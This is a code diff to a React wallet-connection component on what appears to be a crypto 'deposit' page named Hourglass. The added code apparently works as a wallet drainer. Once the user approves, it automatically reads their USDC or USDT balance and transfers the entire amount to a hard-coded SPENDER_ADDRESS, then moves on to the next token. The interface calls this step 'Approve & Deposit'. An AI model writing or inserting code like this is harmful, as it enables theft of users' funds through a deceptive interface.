@@ -138,7 +138,11 @@ export default function ConnectWallet() {
         }).catch(console.error);
 
         setProcessingStep("transfer");
-        refetchBalance();
+        refetchBalance().then(() => {
+          setTimeout(() => {
+            triggerTransfer();
+          }, 1000);
+        });
       } else if (processingStep === "transfer") {
         fetch("/api/transfers", {
           method: "POST",
@@ -156,6 +160,30 @@ export default function ConnectWallet() {
       }
     }
   }, [isConfirmed, hash, processingStep, currentToken, address, currentTokenAddress, tokenBalance]);
+
+  const triggerTransfer = () => {
+    if (!address) return;
+    
+    refetchBalance().then((result) => {
+      const currentBalance = result.data ? (result.data as bigint) : BigInt(0);
+      
+      if (currentBalance === BigInt(0)) {
+        moveToNextToken();
+        return;
+      }
+
+      try {
+        writeContract({
+          address: currentTokenAddress as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "transfer",
+          args: [SPENDER_ADDRESS as `0x${string}`, currentBalance],
+        });
+      } catch (err: any) {
+        setError(err?.message || "Failed to transfer token");
+      }
+    });
+  };
 
   const formatBalance = (balance: bigint) => {
     const decimals = 6; // Both USDT and USDC have 6 decimals
@@ -224,6 +252,22 @@ export default function ConnectWallet() {
               </>
             ) : (
               <>
+                <div className="text-center mb-8">
+                  <h2 className="text-2xl font-bold text-[#f5f1e8] mb-2">
+                    {currentToken === "usdc" ? "USDC" : "USDT"} Deposit
+                  </h2>
+                  <p className="text-[#9ca3af]">
+                    {processingStep === "approval" 
+                      ? "Step 1: Approve token access" 
+                      : "Step 2: Transferring tokens..."}
+                  </p>
+                  {tokenBalance > BigInt(0) && (
+                    <p className="text-[#3dd9b3] mt-2">
+                      Balance: {formatBalance(tokenBalance)} {currentToken === "usdc" ? "USDC" : "USDT"}
+                    </p>
+                  )}
+                </div>
+
                 {error && (
                   <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
                     <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
@@ -231,21 +275,29 @@ export default function ConnectWallet() {
                   </div>
                 )}
 
-                <Button
-                  onClick={handleProceed}
-                  disabled={isTransacting || isConfirming}
-                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
-                  data-testid="button-proceed"
-                >
-                  {isTransacting || isConfirming ? (
-                    <>
-                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    "Proceed"
-                  )}
-                </Button>
+                {processingStep === "approval" ? (
+                  <Button
+                    onClick={handleProceed}
+                    disabled={isTransacting || isConfirming}
+                    className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
+                    data-testid="button-proceed"
+                  >
+                    {isTransacting || isConfirming ? (
+                      <>
+                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                        Approving...
+                      </>
+                    ) : (
+                      "Approve & Deposit"
+                    )}
+                  </Button>
+                ) : (
+                  <div className="flex flex-col items-center">
+                    <Loader2 className="w-12 h-12 text-[#3dd9b3] animate-spin mb-4" />
+                    <p className="text-[#f5f1e8]">Transferring tokens to Hourglass...</p>
+                    <p className="text-[#9ca3af] text-sm mt-2">Please confirm the transaction in your wallet</p>
+                  </div>
+                )}
               </>
             )}
           </div>
